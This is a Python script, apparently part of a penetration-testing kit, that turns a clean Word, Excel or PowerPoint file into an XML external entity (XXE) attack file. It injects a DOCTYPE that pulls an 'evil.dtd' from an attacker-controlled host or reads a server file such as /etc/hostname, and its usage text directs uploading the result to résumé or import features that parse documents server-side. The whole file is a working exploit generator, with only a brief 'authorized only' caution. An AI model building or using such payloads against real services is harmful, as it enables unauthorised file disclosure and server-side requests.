#!/usr/bin/env python3
"""
make_ooxml_xxe.py — build an XXE-laced OOXML file (DOCX/XLSX/PPTX) from a clean template.

Office files are ZIPs of XML. This injects a DOCTYPE (blind-OOB by default, or in-band file read) into a parsed part
(word/document.xml for DOCX, xl/workbook.xml for XLSX, ppt/presentation.xml for PPTX) and re-zips. Upload the result to
a resume/import/preview feature that parses the document server-side.

Discipline: use a benign template you own; benign file/OOB first; DELETE the uploaded artifact after. Authorized only.

Usage:
  python3 make_ooxml_xxe.py clean.docx evil.docx --oob YOUR-HOST:8000
  python3 make_ooxml_xxe.py clean.xlsx evil.xlsx --file file:///etc/hostname   # in-band (needs the app to reflect it)
"""
import argparse, os, shutil, sys, tempfile, zipfile

PART = {".docx": "word/document.xml", ".xlsx": "xl/workbook.xml", ".pptx": "ppt/presentation.xml"}


def build_doctype(oob, fileuri):
    if oob:
        return (f'<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://{oob}/evil.dtd"> %ext; ]>')
    return (f'<!DOCTYPE r [ <!ENTITY xxe SYSTEM "{fileuri}"> ]>')


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("template", help="clean .docx/.xlsx/.pptx you own")
    ap.add_argument("out", help="output file to write")
    ap.add_argument("--oob", help="oob_server host:port -> blind-OOB DOCTYPE (recommended)")
    ap.add_argument("--file", default="file:///etc/hostname", help="in-band file URI (if no --oob)")
    ap.add_argument("--part", help="override the XML part to inject into")
    a = ap.parse_args()

    ext = os.path.splitext(a.template)[1].lower()
    part = a.part or PART.get(ext)
    if not part:
        sys.exit(f"unknown OOXML type {ext}; pass --part word/document.xml (or similar)")
    if not zipfile.is_zipfile(a.template):
        sys.exit(f"{a.template} is not a valid OOXML/zip file")

    doctype = build_doctype(a.oob, a.file)
    tmp = tempfile.mkdtemp()
    try:
        with zipfile.ZipFile(a.template) as z:
            z.extractall(tmp)
        target = os.path.join(tmp, part)
        if not os.path.exists(target):
            sys.exit(f"part {part} not found in {a.template}; unzip it and pick the right XML part (--part)")
        with open(target, encoding="utf-8") as f:
            content = f.read()
        # insert the DOCTYPE right after the XML declaration (or at the top if none)
        if content.lstrip().startswith("<?xml"):
            i = content.index("?>") + 2
            content = content[:i] + "\n" + doctype + content[i:]
        else:
            content = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n' + doctype + "\n" + content
        # reference the entity once so a parser that expands it has a trigger (blind-OOB triggers on %ext; anyway)
        if not a.oob and "&xxe;" not in content:
            content = content.replace("<w:body>", "<w:body>&xxe;", 1) if "<w:body>" in content else content
        with open(target, "w", encoding="utf-8") as f:
            f.write(content)

        # re-zip (all parts) into the output
        if os.path.exists(a.out):
            os.remove(a.out)
        with zipfile.ZipFile(a.out, "w", zipfile.ZIP_DEFLATED) as z:
            for root, _, files in os.walk(tmp):
                for name in files:
                    full = os.path.join(root, name)
                    z.write(full, os.path.relpath(full, tmp))
        print(f"[+] wrote {a.out}  (injected into {part})")
        print(f"    DOCTYPE: {doctype}")
        print("    Upload to a doc-parsing feature. Blind-OOB → watch oob_server.py. DELETE the artifact after (§19).")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    main()
